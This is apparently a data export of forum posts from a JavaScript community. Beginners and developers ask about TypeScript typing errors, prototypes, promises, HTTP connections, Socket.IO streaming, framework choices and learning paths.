	'tutorial': {
		'mobx': [{
			title: '',
			url: ''
		}]
	}
}
```

I get an error inside the `if` &amp; `else` statement on `allTags[tag]`:

```ts
if (tag in allTags) {
	allTags[tag].push(temp)
} else {
	allTags[tag] = [temp]
}
```

stating that:

&gt; Element implicitly has an 'any' type because expression of type 'Tag' can't be used to index type 'AllTags'.

And when I `console.log(allTags, typeof allTags)`, I get both `undefined undefined`

I tried setting an empty `{}` object on `allTags` but it doesn't work either.

4861,2021-09-08 06:34:19,43,1,"I've heard many times devs bashing javascript for its implementation of OOP through prototypes (delegation) as if it's not ""real OOP"".

Yet, to me delegation seems to be the most powerful and flexible approach to code reuse, b/c it allows to effectively combine composition and inheritance together and change behavior at runtime.

I'm reading ""Thinking in Java"" now, and here's what I've found there:  


&gt;A third relationship, which is not directly supported in Java, is called delegation. The is midway between inheritance and composition, because you place a member object in the class you're building (like composition), but at the same time you expose all the methods from the member object in your new class (like inheritance)…  
&gt;  
&gt;Despite the strong emphasis on the inheritance, in the object-oriented programming, when you start a design you should generally prefer composition (or possibly delegation) during the first cut and use inheritance only when it is clearly necessary. Composition tends to be more flexible. In addition, by using the added artifice of inheritance with your member type, you can change the exact type, and thus the behavior, of those member objects at run time. Therefore, you can the behavior of the composed object at runtime.

4866,2021-09-10 10:52:52,30,1,"I am a bit new to javascript, so apolozige if this sounds too basic.

What I wanna do is:

Have an array of objects (lets call it array a)

Then have multiple other arrays (b1, b2, etc), that point to some of the objects in ""a"".

Then, whenever an element of ""a"" is removed, it should also be in all the other arrays that point to it.

...

I know Javascript does not have pointer. But there must be a way to do the same thing right? Simply doing a .push from an already existing object in ""a"" would be enough?

...

I am not sure how I could solve this problem in the most efficient way.
But one idea would be that each object in ""a"" would aditionally contain an array with the indexes in the arrays ""b"" that are pointing to that object in ""a"". In this way, you could instantaniously knoe the indexes in ""b"" to delete, whenever ""a"" would be deleted.

Example; after this block I would expect the stored data in y to be removed, but it is not (determined through trying checking y variable in console which presumably does some funky reflection)

    x = [{a: 1}, {b: 2}, {c: 3}];
    y = new WeakMap();
    y.set(x[0], 'metadata about {a: 1}');
    x.splice(0, 1);
    
    // wait any amount of time
    // y still contains the element

    y.set(x[0], 'metadata about {a: 1}');
    delete x[0];

or

hey guys, i started working on my first app - and not knowing anything about anything but having a bit of experience with python, i did this with django.

i quickly realized that webapp require javascript, and somehow my project morphed into one index.html file with a bunch of js files that i combined together with webpack.

so...i'm not even sure what part of my app uses django at this point..maybe just the part that routes a url to the html file and some security stuff(cors??) - because im using fastapi and postgres to fetch data.

that got me thinking...ok i probably dont need django. so my question is...why do i need react?

i'm ultimately trying to keep my webapp a single page as is apparently fashionable. the only thing i can think of is that async/await has been pretty slow...but i just figured ill switch to graphql for api stuff.

am i missing something? totally new to this, and would like to get some thoughts from everyone so i cross-posted with r/reactjs",[AskJS] vanilla js + webpack vs react

As a user accessing the browser, when I go on the link, we will say it is link A, it will redirect me to link B which is the STS website. There is this acknowledgement checkbox and then another button that says to login using PKI certificate. Once that is pressed, I select my PKI certificate, input my pin code, then a page shows up saying ""Please wait for client to redirect"" with a spinner and then it will redirect to the correct page, with the browser bar showing link A.

Now for me trying to access the website, the first thing I perform is a GET request on link A. I have httpclient set to allow all redirects. The response to the GET request, is the STS website with the account login page, which I referred as link B. I looked into the body of link B, and for the button, there is an action which is a parameter link, as well as a token, and the method tag says POST. 

I then grab the parameter link and I grab the main url of link B (meaning I removed the parameters of link B and maintained the main URL) and I appended the parameter link to link B, and I included the token as the body. I performed a POST and I was prompted by inputting my PKI certificate and pin code. 

The response to that POST, was the html page of ""Please wait for client to redirect"" but the status of that page is 200 OK, but it won't redirect. I assume there is javascript code occuring that performs the redirect, but I don't know how to access that.

I bored so why not to try disprove a bashing title with 460 upvotes of professionals.

The claim was that ""Node is over 20X faster than Python3.8"".

Lets start:

The Python Implementation:

    def fib(n: int):
        if n == 1 or n == 0:
            return 1
        return fib(n - 1) + fib(n - 2)
    
    fib_wrapper(35)

**Execute on my old laptop in 9324.5862 MilliSeconds. (Woof, really old laptop)**

Node have JIT. Python doesnt.

Lets attach Numba JIT to make the board clean:

    @jit(nopython=True)
    def fib_numba(n: int):
        if n == 1 or n == 0:
            return 1
        return fib_numba(n - 1) + fib_numba(n - 2)
    fib_numba_wrapper(35)

**Execute on my old laptop in 541.8728 MilliSeconds.** 

*But wait !*

While Node is running the JIT is already loaded. Numba waits for the first call.

Lets add a ""load\_numba()"" function, that will load Numba to the memory. (plain board - remember ?)

    @jit(nopython=True)
    def load_numba():
        """"""lets wake up Numba""""""
        i_sum = 0
        for i in range(1, 100):
            i_sum += i
    
    @jit(nopython=True)
    def fib_numba(n: int):
        if n == 1 or n == 0:
            return 1
        return fib_numba(n - 1) + fib_numba(n - 2)
    
    load_numba()
    fib_numba_wrapper(35)

**Execute on my old laptop in 272.8922 MilliSeconds.**

**And its still slower than Node 14 !!**

But Wait !!

While on my laptop I reached from **9324.5862 MilliSeconds** to **272.8922 MilliSeconds**, which is improvement by \~34.27 factor.

In his I9 that execute native in  **2021.4319229125977 ms,** with improvement of 34 we will get  **59.31414141414 ms .**

So, when I create my class in typescript and compile, I am getting this weird duplication on my javascript file.

&amp;#x200B;

Please take a look at this below code snippet

# This is my TypeScript code

    class Department {
    	private employees: string[] = [];
    
    	constructor(private id: string, public name: string) {
    		this.name = name;
    		this.id = id;
    	}
    	describe(this: Department) {
    		console.log(`This department is ${this.name}`);
    		console.log(`This department is ${this.id}`);
    	}
    	addEmployee(employee: string) {
    		this.employees.push(employee);
    	}
    	printEmployeeInfo() {
    		console.log(this.employees.length);
    		console.log(this.employees);
    	}
    }

This is my compiled JavaScript code

    ""use strict"";
    class Department {
        constructor(id, name) {
            this.id = id;
            this.name = name;
            this.employees = [];
            this.name = name;
            this.id = id;
        }
        describe() {
            console.log(`This department is ${this.name}`);
            console.log(`This department is ${this.id}`);
        }
        addEmployee(employee) {
            this.employees.push(employee);
        }
        printEmployeeInfo() {
            console.log(this.employees.length);
            console.log(this.employees);
        }
    }

As you can see, when compiled, in JavaScript constructor lines, there are duplicates for [this.id](https://this.id) and [this.name](https://this.name)

I have no idea why it's causing this problem

If I do it like this on TypeScript, I don't get any duplication

    class Department {
    	private employees: string[] = [];
    	private id;
    	public name;
    
    	constructor(id: string, name: string) {
    		this.name = name;
    		this.id = id;
    	}
    	describe(this: Department) {
    		console.log(`This department is ${this.name}`);
    		console.log(`This department is ${this.id}`);
    	}
    	addEmployee(employee: string) {
    		this.employees.push(employee);
    	}
    	printEmployeeInfo() {
    		console.log(this.employees.length);
    		console.log(this.employees);
    	}

Any advice or suggestions are appreciated! Thanks again",Question from a super beginner

***=&gt; Web Dev: I have been learning javascript , django , html , css and js libraries like jquery , React , Vue (not a expert in any of them) for quite some time and made quite a bit of websites for personal use and quite a bit of userscripts and chrome extensions.***

***=&gt; Game Dev: I started learning gamedev with pygame at 14 and soon after started learning unity at 15 the reason i started to learn to code initially was to make games so game dev is one thing really close to my heart i have been developing a game for 20 months now for android with unity and hope to publish it one day. I also participated in few game jams.***

***=&gt; Bots: I orignally started learning*** [***discord.py***](https://discord.py) ***to make a nice bot for my server but quickly developed intrest in other bots using api it extended to reddit , instagram , twitter my latest bot was a bot that would download posts from reddit and post them to instagram with attribution and a caption and desired hashtags, eventhough making bots isn't a job it seems quite fun to me and wanted to include it.***

&amp;#x200B;

***When i see all these intrests i just don't feeling like choosing one of them i don't have a bias over any field. As time passes i keep developing new intrests and kind of worries me ,recently i have been thinking to  learn about microprocessors , electronics and finally raspberry pi. It doesn't seem like i have streamlined intrests in development.***

4967,2021-10-18 12:01:13,6,1,"Hey, so this happened few days ago.  

I am learning python and javascript for the past year and a half and I though it might me a good time for me to apply for a dev job. 

I found this one in pretty good looking company doing eshop and web projects, they were hiring back-end junior python developer for django. On their site they stated that before an interview, they will send you a task to solve. So I applied, got a mail, recruiter said that the task could be submitted multiple times.

 The task was quite easy for me, since I've been practicing some algorithms before. In the end I've managed to get O(1) solution, so I was pretty excited and happy for myself. This went good, right? 

Well, no... After two days I got a mail saying something like: thank you for your time, we decided not to continue the hiring process. Pretty disappointed I asked what went wrong, I thought it might be my terrible CV, since I don't have any dev background nor the degree. Recruiter responded that I didn't do the task right. 

For me it seems that when I tried to submit a first solution (and that one had some errors) it was saved and the other three that I tried (and were correct) were not saved. I wrote that it seems odd, that the task was not correct since I submitted three solutions that seemed to pass all the test cases.

After this mail recruiter started to ignore me. 

I just needed to wrote this somewhere, since I feel pretty down because of it.

Cheers dudes.",Rejected after successfully solving a given task

It’s platform agnostic, meaning it can be used with any JS framework (React, Vue, Svelte, etc.), or no framework at all. It’s also built for the JAMstack community mainly, as it handles backend validation, storing submissions, sending emails, integrating with other third party apps, for you. It even allows you to build HIPAA compliant forms! (Just launched that feature 2 weeks ago finally.)

Finished with the courses, I felt confident in creating my first app using SwiftUI.

I decided to rebuild one of my favorite computer games as a kid—the classic Lemonade Stand. 

**Day 1 - 2:**

I used Adobe XD to mock up how I wanted my app to look, such as button placement, people, and the lemonade stand itself.

**Day 3 - 8:** 

Graphics is not my strength, so I decided to reach out for help. I used Fiverr, where I bought someone's package of ""I will design game UI, menus, assets, and layout."" for $127. This may have been pricey, but it saved me days of creating the graphics myself. I handed the designer my mockup I made in Adobe XD and he went to work delivering the product after five days.

While the graphics were being created, I used Swift Playground to write the view model &amp; the model's logic. I've always followed the MVC architecture pattern, primarily since I use ROR frequently, but I decided to give MVVM a try. It seemed more suited for what I was trying to accomplish.

**Day 9 - 15:**

This is where I combined the logic of the game I created in Playground with the graphics provided to me by the designer from Fiverr. I spun up XCode creating a new project, and went to work. I followed the MVVM architecture pattern by making the Models, ViewModels, and then the Views. Everything came together perfectly; the logic worked as expected, and the graphics looked great. 

**Day 10-15:**

I'm a competitive individual and thought this games would be more fun if you could compare how well you were doing against others.

I wanted to implement a scoreboard. I knew I would need to add a database for high scores; other players can see how they are doing. I turned to Google firebase using the Firestore Database. Never using CocoaPods before and not seeing a benefit to its use on this project, I decided to use the new Swift Package Manager to install the Firebase SDK. 

**Day 16 - 30:**

This is where I slowed down. I wanted to add more to the game than static images. I wanted sprites (people) to walk back and forth when the day began. Using javascript in the past to make sprites walk by iterating over a set amount of images that give a Sprite the illusion it's walking, I figured this could be accomplished similarly. When searching for ""how to make a sprite walk SwiftUI""  with google, the results yielded articles and forums on ""How to integrate sprite kit with SwiftUI."" Running into issues with iterating over images with SwiftUI, I decided to give SpriteKit a try. I learned about .atlas folders and how I could use them in a SKScene and include SKTextureAtlas to create sprites. I took the scene and rendered different instances of it in a SwiftUI view with a .clear background. 

During these 14 days, I also hired another Fiver artist to create sprites out of 3 different people delivered from the first Fiverr gig. This Seller charged $10 per character. Once delivered, I edited them in Adobe Illustrator to change their colors to make more than just 3.

**Day 31-35:**

From reading articles about SwiftUI, Haptic Feedback was mentioned many times and how it increases user experience. Wanting my users to have a pleasant experience, I took the time to create a constant file where I added the Haptic Feedback constant to be reused throughout the app. I added the feedback anytime a button was clicked. 

In addition to haptic feedback, I added background music and sound effects for buttons. When having background music and sound effects, I learned that I need to create two instances of the AVAudioPlayer; this way, the sound effects won't turn the background music off.

**Day 36 - 40:** 

Google AdMobs and AppleConnect Submission. Adding AdMobs to my app was tricky. I learned how to use CocoaPods since there isn't an SDK available by Swift Package Manager for Google AdMobs. When initializing and installing CocoaPods, I wasn't aware that a new project gets created in the directory called project-name.xcworkspace. I had many errors of google AdMobs not being found and couldn't figure out why. Searching through forums for answers, no one mentioned that a new workspace was created that should be used going forward. After uninstalling and installing CocoaPods for the 10th time, I finally read the output in the console, which mentions using the new workspace project generated.

**Day 41-42:** 

App has been submitted and approved by Apple. I now have an App on the App Store!

5003,2021-10-31 13:30:50,1,1,"Wish to apologies upfront if this is not the place to ask this. I tried in r/GoogleAppsScript already but unfortunately nobody is responding there and therefore I wish to to ask your assistance as well.

**Introduction**

I have a spreadsheet and the idea of this spreadsheet is that any user can input his or her transaction history in the sheet ""history"" and based on this history, an overview is provided of a person's realized gains (=they have sold it in the past) and their unrealized gains (= never sold it). A script is run which then creates a report (sheet: Report) with the necessary data. A query table summarises this data in the summary of RG report sheet. Based on this summary, the position sheet is created, which shows all the current positions held by the user. The user can chose to run the script by going to the menu CoinAtlas&gt;Build Report&gt;LIFO or HIFO. Please see here the [sample sheet](https://docs.google.com/spreadsheets/d/1vjaHS89jGVjxp82wnWThgEdGa8MthyUKlE3pr19JqcI/edit?usp=sharing).

**What is FIFO and LIFO?**

These are accepted accounting methods to calculate realized gains. FIFO (=first in, first out) &amp; LIFO (=last in, first out). An example of FIFO: You buy 2 stocks of company A for 10 dollars each at date Y. At date Y+1 you buy 2 more stocks of company A for 15 dollars each. You hold 4 stocks of company A. You decide to sell 3 stocks of company A for 20 dollars each. Profit is then calculated as (3 \* 20-(2 \* 10+1 \* 15)) = 60 - 35 = 25 dollars. The same scenario LIFO would be: 60 - 40 = 20 dollars.

**Description of the problem**

When building a report, for whatever reason, the stock MSTR and the cryptocurrency THETA is ignored and not shown in the output sheet ""Report"" when running the LIFO script and when running FIFO THETA is ignored (the only difference between the two scripts is the sorting in the beginning, one ascending and the other descending). The script was written by an experienced programmer who unfortunately no longer responds to this issue. With my beginner's skills in javascript/google app script. I cannot seem to find out why. I suspect it has to do with the input data, as with different data this error does not occur. 

**The FIFO script calculation**

      const inputSheet = ss.getSheetByName('History');

In this blog post,we have something like 
```js
var callbacks = [
  function() { console.log(1); },
  function() { console.log(2); }
];
```

if we want to call every function with `forEach` method, we cannot do this

```js
callbacks.forEach(Function.prototype.call);
```

The reason is that, as the author pointed it out, this would be something like this

```js
Function.prototype.call.call(undefined, callbacks[0]);
```

This is something I have been struggling to understand - I understand how `Array.prototype.forEach` works and how `Function.prototype.call` works separately and I think I understand what `callbacks.forEach(Function.prototype.call)` means - it means we invoke `Function.prototype.call` for every item in the array i.e. `callbacks`. But in my mental model, this would become

```js
Function.prototype.call(item, index, this)); // this points to the array
```

But the author said it is `Function.prototype.call.call(undefined, callbacks[0]);` and that's why this approach doesn't work.


I think there must be something wrong in my mental model about how `Function.prototype.call` works. Can someone please help me understand this.",[AskJS] Need some help understand this blog post about `Function.prototype.call`

User registration (so a user could register and login to website);
Live chat;
Upload profile/listing (for dating websites);
Online shop(so user could buy online);

Is javascript the right language for this? Or will I have to learn more than that? Also where does the back-end coding comes in?

Our app is more like a  development platform that can produce many ""apps"" during the build  process. We have our base modules (like the ""application core"" described  here: [https://addyosmani.com/largescalejavascript/](https://addyosmani.com/largescalejavascript/))   We then mix and match our other modules as needed to suit individual  customer's needs.

The advice I was given to combat this issue is to cover the fundamentals of the language I choose and move on to projects.

So I found this website for JS  but I dont know if other langs have similar websites or where I can find them.",Is there a website like this for python as well

Over the last few years, I've picked up some automation skill with python and javascript. I've done some React / Svelte stuff to build to build a few basic serverless websites or create a simple UI for some data entry. With python, its more one-off scripts, Lambdas or a flask server for something small. I enjoy working with both these languages and love the flexibility that gives me :) but it also gives me a lot of choices. My goal has always just been ""automate annoying tasks"". Sometimes this requires a GUI so others can do the work vs me. I'm on a team thats more python heavy than javascript, so I just wanted to explore what setups folks like working with - I've not done anything with Django or Jinja, so dunno how the experience with those.

5087,2021-12-01 17:19:24,6,1,"If you have javascript enabled in the browser, websites can identify you relatively uniquely based on your behavior. The most common is probably keyboard finger stroke behavior. But users can defeat this by using Kloak (source code is [here](https://github.com/vmonaco/kloak)), which adds a random lag after each keystroke.

But there are other ways of identifying users, such as mouse scroll/wheel speed, and general mouse speed. There is a good article [here] (https://news.softpedia.com/news/tor-users-can-be-tracked-based-on-their-mouse-movements-501602.shtml) describing it, as well as some other techniques that can be used to identify users. 

I was curious to know if anyone here might have some high level ideas on how to defeat these two measures (mouse scroll and mouse speed). The most obvious thing I can think of is to follow Kloak's example and just add a random lag while using the mouse wheel or moving the mouse around.

Basically, you give it a page of code, tell it what programming language it is written in, and it displays it using a configuration you set up (font size, color schemes for the fonts and background, etc.) in a browser page.

I have been setting up an editor using a Swift port/interface of CodeMirror 5. I've encountered an issue that prevents me from moving forward until I resolve the issue. In doing research, I discovered that Version 6 is a complete re-write of the package and so the API has changed. There are two projects on GitHub ([CodeMirror-Swift](https://github.com/ProxymanApp/CodeMirror-Swift) and [CodeMirror-SwiftUI](https://github.com/Pictarine/CodeMirror-SwiftUI)), both of which use Version 5. There are no indications they are working on a replacement. I understand it is a big undertaking.

I'm not a javascript programmer, but I know there are a lot of you out there.  Is there anyone interested in giving it a go? Version 6 promises to deliver a better mobile experience.

As for that issue I'm having: scrolling (dragging the cursor) works fine in the WKWebView used by CodeMirror, but when I tap anywhere in the display it causes a UIToolBar to be created (with navigation buttons and a ""Done"" button) and it isn't happening correctly (there are issues with constraints). Since the file is being displayed as read-only I don't need it to respond to taps, but I don't know how to disable that. 

Please let me know if you have any ideas/suggestions! Thanks.",Is Anyone working on a port of CodeMirror 6 to Swift?

Let's say we are using HTTP1.1 and we have `Connection: Keep-Alive` 
if in the html we have 
```html
&lt;script src=""https://foo/foo1.js""&gt;&lt;/script&gt;
&lt;script src=""https://foo/foo2.js""&gt;&lt;/script&gt;
&lt;script src=""https://foo/foo3.js""&gt;&lt;/script&gt;

&lt;script src=""https://foo/foo6.js""&gt;&lt;/script&gt;
&lt;script src=""https://foo/foo7.js""&gt;&lt;/script&gt;
```
will each one of the scripts result in a new TCP connection established or all the subsequent requests will reuse the first TCP connection established by the first script tab? And if each one of these script result in a new TCP connection established, given the browser's limit for concurrent requests being 6, does the 7th request have to wait until the 6th request to be finished in order to establish the connection?

The above example is about initiating requests from HTML tags. What about api calls made from JavaScript? Let's in our javascript we have 

```js
const result1 = apiCall1()
const result2 = apiCall2()
const result3 = apiCall3()
const result4 = apiCall4()
const result5 = apiCall5()
const result6 = apiCall6()
const result7 = apiCall7()
``` 

And assume the endpoint that those API calls are hitting is all `api.foo.com/v1/tasks`, my questions are, again: will each one of the api call result in a new TCP connection established or all the subsequent requests will reuse the first TCP connection established by the first api call?

5120,2021-12-12 04:41:02,0,1,"I wanted to make some videos for youtube on a lesson topic, and originally I was gonna make the background graphics/animations using powerpoint. Powerpoint is handy because doing ""complex"" animations like fading in or moving around only require a single click. Unfortunately, powerpoint exports as a video in 1080p max at 30fps whereas I would like 1440p 60fps.

Another huge disadvantage is that animations can't easily be changed or applied en masse. For instance, if I work hard to make a cute entrance animation, it's not so easy to just make everything that appears on the screen animate the exact same way. And if I wanna change how that animation looks... I'm gonna have to change every instance manually. 

My friend had the idea of using something like javascript to do animations instead. I could use template everything to the point where I can just call `myText.appear()` and just make the `appear` function do exactly what I want. I'm basically wondering if something equivalent to [Manim](https://github.com/3b1b/manim) but using javascript instead of python (though I'm ok if a python solution exists), and I just want to animate fairly simple shapes (boxes, circles, arrows, text, etc) rather than mathematical visualizations.

I've looked around and found [Mo.js](https://mojs.github.io/) which seems super cool, but it doesn't look like animations can be exported as a video? I want to avoid having to screen record if I can because I feel like the video quality is never as good as had it been directly exported.

Are there any frameworks that would work for me?",[AskJS] Making motion graphic animations with javascript?

5124,2021-12-12 20:01:09,0,1,"I am trying to Stream a video feed from a simulation inside Unity to a webinterface using Node.js. The Problem is, that a continuous stream of images causes the server to output an error in the console and the sender-socket to disconnect.

&amp;#x200B;

In Unity I am using \[this\]([https://github.com/doghappy/socket.io-client-csharp](https://github.com/doghappy/socket.io-client-csharp)) library to send an image from a camera inside the unity engine encoded in JPG like this:

\`\`\`c#

public void SendCameraImage()

{

if (socket == null) return;

&amp;#x200B;

socket.EmitAsync(""cameraImage"", sensors.GetCameraView(1));

}

\`\`\`

&amp;#x200B;

The server then handles this data as follows:

\`\`\`javascript

socket.on(""cameraImage"", data =&gt; {

console.log(data);



clients.forEach(client =&gt; {

client.emit(""cameraImage"", data);

});

&amp;#x200B;

});

\`\`\`

&amp;#x200B;

Everything works fine when I try to send the image one time (e.g. in the start-method) and tying this to a button and clicking it many times in a row also works like it should. When I repeatedly send the data (e.g. in the update-method or any other automatically timed method) the server eventually outputs this and the socket is disconnected.

&amp;#x200B;

\`\`\`

&amp;#x200B;

I was not able to find much documentation about this error online.

&amp;#x200B;

Using a hex editor to take a look at the received data I was able to find out that the last received packet, that crashes the socket contains not only one JPG image but two. I don't understand how that would crash the server though, because it doesn't really handle or try to interpret that data. It only sends it on to the connected clients, which in turn interpret the data for display output.","[Help needed] SocketIO, Unity: Stream of images causes error in server and disconnects socket"

When you read through the documentation or go through the tutorials, you find that there is a lot you *can* do with TypeScript. I'm curious as to how much of TypeScript you actually use, i.e. incorporate into your projects.

I come from a plain JS and React background, and much of TS just seems unnecessarily... ceremonial?

I can appreciate defining types for core functions, but I struggle to understand the real-world gains (outside of some nice autocompletes here and there) provided by buying into the language wholesale.

So my question is, how much of TypeScript do you use in your projects? And if you implement more than the basics, what clear wins do you get as you incorporate more and more of TypeScript into your project? TIA",[AskJS] How heavy do you lean into TypeScript?

I want to build a Web app and will get help from a developer. It's pretty simple so I'm thinking of trying to co build it. 
 
Infact I think the solution could be fairly extensively built even on wordpress! The solution as far as the user is concerened relies on vanillajs and vanillajs libraries. 

So I'm not sure how to proceed. 

1. Build it on wordpress and I can then easily add back end functionality, payments, mbership, user authentication etc using plugins, even deployment etc is fairly simple. 

2. Build it using vanilla js, it'll be faster than react, simpler solution and I won't be able to add any of the above bells and whistles unless I hire the developer for longer . But I'll learn and Co build. 

3. Build it using react js. I'll have trouble Co building it probably all together. But it'll be a scale-able solution. Unfortunately it will probably cost more, take longer to ship, and like the 2nd option will not get some of the wordpress out of the box stuff. 
It may also be introducing unnecessary complications. 

I'd love to get some feedback?

Is that teen who brings a USB killer to highschool to break computers. That one thinks they know everything about cybersecutiry and really know little to nothing, but downloads scripts from the internet and browses through the TOR network.

Here I am adapting that word to the world of programming, like, someone who thinks they know a lot about computers and programming when all they did was following a 10 video series of tutorials to build something up basically using a ton of libraries that do everything for them. They will go claim they built let's say, a hand tracking AI program when they only imported the mediapipe library and opencv, and they can't even code a sorting algorithm for themselves.

5143,2021-12-20 16:03:02,0,1,"**Last August, discord.js V13 was released, and with that the new features of discord: Interactions. However all popular frameworks like ""Discord akairo"" and ""Commando"" have been deprecated at this time. Indeed the amount of work for the updates was too important. At this moment, Sheweny was born.**

The idea for ""Sheweny"" came to me when I wanted to start coding a bot with discord.js V13 and had to update my code. It took me a while to figure out how the interactions worked and it turned out to be pretty complex. I also noticed that around me programming beginners had difficulty updating their bot, to the point of not changing the version for some. At this point I started to code Sheweny. The goal was to make it easy for everyone, even beginners, to do a discord bot.

Main features of Sheweny :

- Modular and reloadable commands, inhibitors, events and interactions.

- Flexible command handling and creation.

- Interactions support like slash-commands, buttons, select-menus, modals.

- Powerful and thorough command arguments parsing.

- Development mode to limit errors

- Full javascript and typescript support 

During the development of this framework the main difficulty was to create reusable classes everywhere in order to be able to develop new functionalities very quickly. Indeed the interactions are young at discord and new functionalities come out very often. Thanks to its very modular structure the framework can be updated very easily. This allows Sheweny to be each time the first framework to support new discord features !

Here's the [Github repository](https://github.com/Sheweny/framework) if you'd like to review the code. Also here is the [Github organization](https://github.com/Sheweny) for discover more projects like CLI, Website etc.

Sheweny was my first big project and I was very happy to see people like it. If some people have ideas, improvements or comments to make on the project, I will be very happy to listen to them. Thanks for taking the time to read this article and thanks to everyone who contributed to the project, from the star left on the github to the people who contributed the code❤️

5145,2021-12-21 01:41:51,0,1,"Promises suck and here's why:

Basic promise code:

```javascript
const x = new Promise((resolve)=&gt;setTimeout(resolve(1),100))
( async ()=&gt; console.log(await x) )()
```
The same code with callbacks:
```javascript
const awaitX = (resolve)=&gt; setTimeout(()=&gt;resolve(1),100)
awaitX((result)=&gt; console.log(result))
```

* The promise code has extraneous information: `new`, `Promise` and `async`
* The callback code has extraneous information in `(result)=&gt; console.log(result)` vs `console.log(await x)`.  
However this is only due to the syntactical sugar built into javascript's `await`.  Similar syntactical sugar could and should be implement for callbacks.  It's probably fairer to compare this to `.then((result)=&gt; console.log(result))` which has an extraneous `then`

The callback code is simpler than the promise code and has the added benefit of not requiring an entire promise library's code, nor learning how to use promises.  All javascript programmers should learn about callbacks, irrespective if they use promises or not.

When I started my javascript journey, I spent a lot of time learning and trying to understand promises as promises was touted as the way to go.  Only after I mastered them, did I start to learn about callbacks - mainly due to functional programming.  Once I understood callbacks, I realised promises are not required and do more harm than good.  The same way classes are not required.

One argument that will be made for promises is that they force more structure than callbacks.  However if structure is the goal, then there are other simpler and better ways to achieve that outcome.  For example a simple naming convention could be used to identify all promise-like callbacks.  Or a typescript type could be used to standardise `resolve` and `reject` callbacks.

Promises seek to reduce the complexity of infinity by providing limited structure, however after implementing promises infinity remains and so they solve nothing, but they do introduce a raft of additional problems and complexity.

A far better solution to the problem of infinity, is to educate developers to understand javascript and how to use it well, clearly and concisely.  And as callbacks are fundamental to javascript it's far better to learn callbacks than promises.

Promises taught me a lot about asynchronous programming, but I feel if I had invested equivalent effort into understanding callbacks first, I would have arrived at the destination sooner, with far less frustration on the way.

Anyway, that's my opinion, I'm sure not everyone will agree - but I thought I would share it for junior devs and encourage them to understand callbacks before learning promises as I wish someone had told me that.",[AskJS] unpopular opinion: promises suck

I'm a Computer Science student, currently doing my second year. I've started my programming adventure with udacity java course and that was my entrance to coding. Then when I've started my degree we've began with C to move on to C++. In second semester they've added HTML+JS+CSS combo for websites and for my CI/CD project I've done fairly simple application in Kotlin that I've managed to learn a little by myself. Now in this semester I'm doing Microsoft SQL Server database project which makes me learn both SQL and the MSSQLServer by myself and they've added Java to curriculum so now it's uni level, not udacity free course anymore. Also this semester is Python and JS introduction but it's quite intense ngl.

A month ago I asked myself what I want to do, cause I need to go to apprenticeship so I can receive my engineering degree. I've asked a lot of my friends that are coding what should I try. Besides a lot of rust reccomendation (which is useless for me as nobody even remotely close to me is working in Rust and is willing to accept apprentice), lots of hatred towards Java, lots of useless advices telling me to go for a javascript cause ""why wouldn't you do the same thing 90% of university students are working in"" I've got quite a lot of people telling me to go and try C#. 

I've heard a lot about documentation of C# and it was mostly praise for how good microsoft is doing in terms of learning the language from documentation so I've decided that I want to give C# a go.

So now I have quite an ambitious task in front of me - I want to learn C# by doing one, big application.

So I want to do a budget management app. You know, you put your earnings in it, then you write down all the spendings you're doing, you can upload your receipts, track down your subscriptions with reminders when will be next payment.

What aspects I need to learn to build Windows app, MacOS app, iOS and Android App and later on to connect all of that to database and make a web app with login and all of that stuff. I've heard that for mobile I'll need to learn Xamarin and for webdev I should check out [ASP.NET](https://ASP.NET) Core. 

So please tell me - is it even possible to do with C# and MSSQL Server or I'm st00pid and overambitious. And if it's possible what should I learn and maybe from which part to start (windows or macos app or maybe start with the web app).

Currently, only supports `udp_socket` but I am planning to support `tcp_socket`, `websocket`, `http_request` in future. It is based on Qt framework and uses `QJSEngine` to interpret javascript codes.

I use this application in my daily development as helper tool, for example I write dummy emulator of outer systems which I am going to communicate. Or playing around some hardware/software/system by sending or receiving bytes according to the datasheet. So generally I am aiming to have a rapid prototyping, debugging or testing tool of network things. It also supports serialization/deserialization of primitive types with specific byte order (Little Endian, Big Endian).

POINT 1: -  My question is shouldn't the temp=temp-&gt;next; inside the while loop should also affect or modify the original head? Head has been passed as a reference to this function. My confusion arises because \*temp = \*head, the temp has been assigned head. 

POINT 2: - If temp copy, then how come can it affect the original linked lists. This is another point, that I wasn't able to understand clearly on StackOverflow.

5188,2022-01-09 20:41:13,0,1,"I am wondering when we declare primitive values like numbers twice, do we end up with two distinct memory blocks allocated to store the value? For example:

```js
const number1 = 123
const number2 = number1
```
or 

```js
const number1 = 123
const number2 = 123
```

Is it going to only one `123` existing in the memory or two? I recently learned the [justjavascript](https://justjavascript.com/) course from  Dan Abramov and he said that the right mental model for javascript's primitive values are that there are only one `1` and `2` and `3` etc. in the memory and they are immutable, you can only summon them in your js program, but not create them, which I found it easy to understand but not 100% convinced it is true. According to this article from V8, https://v8.dev/blog/react-cliff, it seems like only when the number is big enough, they become `HeapNumber`, which are memory entities on the heap. In other words, if the number is not  `HeapNumber`, it should just be a plain number. 

I remember in C/C++, if you have 
```c
int a = 123
int b = 123
``` 
you would end up with two distinct memory blocks for both integers. 

So my question is, is there a way for us to quantitatively analyze a js program's memory allocation? My understanding is that, if I compare a js program with only one `const number = 123` and another with a thousand variable declarations like `const number = 123` and see if they end up consuming the different amounts of memory, then I would know whether or not it is true that we only have one `123` or not.

So what book will give me head start so I can go to django soon?","Python resources for a beginner having experience in js, node and react"

I'm a total javascript beginner, but have some basic experience with C#.

Is there an easy way to align an image to exact coordinates? maybe with a libary.  
the goal is to create a website that just should load once and then run only locally through the browser, it should be a classical RPG skilltree calculator for a niche game.

I tried d3.js a few months ago for a little bit but the whole declaring and selecting of different divs etc. seemed pretty complicated and confusing for a beginner, thats why I'm asking for a simpler solution to this. all I need is to be able to place images on exact coordinates.",[AskJS] easy way to position image to coordiantes

5215,2022-01-21 16:33:56,0,1," Hello everyone,

I'm currently a functional consultant for a procurement platform. Said platform supports an iFrame page and communication via API.

I don't have a lot of knowledge about systems and programming but I was able to create a simple module using javascript.

How I did it: I've coded the interface and used axios to perform the API calls and send information filled by the user back to some documents in the platform. I've then uploaded the html file with the js code inside the platform and displayed it via iFrame.

The problem is, the application authenticates via an API key and the user can 'inspect element' and see the key and possibly leak it.

So I have a few questions:

Is it possible to obfuscate the API key for the user?

If not, what would be the best way to host that application outside the platform so the user can't see the key? What would be the best option? And what would be the cheapest option?

Thanks a lot guys",[AskJS] Best way to host a JS code that performs API calls
